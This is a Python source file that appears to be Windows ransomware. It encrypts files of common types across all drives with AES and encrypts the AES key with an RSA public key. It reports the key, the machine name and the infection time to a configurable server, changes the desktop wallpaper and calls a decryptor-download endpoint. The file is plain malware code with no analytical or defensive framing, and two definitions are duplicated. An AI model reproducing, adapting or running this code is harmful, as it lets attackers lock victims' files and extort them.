from encryption import AEScrypt
import os
from Crypto import Random
from visuals import UpdateDesktopBackground
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import requests as rq
import sys
import vars
from datetime import datetime
import string

SERV_HOST="http://127.0.0.1"                                                                                                            #change
BACKGROUND_URL="https://i.natgeofe.com/n/33ddfb0f-ebab-4966-9eb2-53b2ac58ee53/canada-goose_thumb_4x3.JPG"                                #change







def encrypt_priv_key(msg, key):
    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    ciphertext = cipher.encrypt(msg)
    return ciphertext

driveLetters=string.ascii_uppercase
key=Random.new().read(32)
crypter=AEScrypt(key)
ckey=encrypt_priv_key(key, vars.PKEY)

extensions=[".txt", ".exe", ".jpeg", ".jpg", ".png", ".jpg", ".db", ]
data={
    "KEY":str(ckey), 
    "CNAME":str(os.getenv("computername")), 
    "INFDATE":str(datetime.now())
}

def encrypt_priv_key(msg, key):
    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    ciphertext = cipher.encrypt(msg)
    return ciphertext


ckey=encrypt_priv_key(key, vars.PKEY)

def diskencryption():
    for let in driveLetters:
        if os.path.exists(let+":\\"):
            for root, dirs, files in os.walk(let+":\\", topdown=False):
                for file in files:
                    curfile=os.path.join(root, file)
                    if"Windows" not in curfile:
                        for ext in extensions:
                            if curfile.endswith(ext):
                                crypter.encrypt_file(curfile)
                            elif curfile.endswith(".cnkd"):
                                pass
                    else:
                        pass
        else:
            pass                


def add_client():
    resp=rq.post(SERV_HOST, json=data)
    if resp.status_code==200:
        return True
    else:
        return False


def main():
    UpdateDesktopBackground("https://kc.mcafee.com/library/MCAFEE/CORPORATE_USER/CORP_TS_AGENT/dwolhart/Background_Desktop.jpg")
    diskencryption()
    if not add_client():
        print("server offline")
    rq.post(SERV_HOST+'/download-decryptor')
    



if __name__=="__main__":
    if sys.platform=="win32":
        main()

    

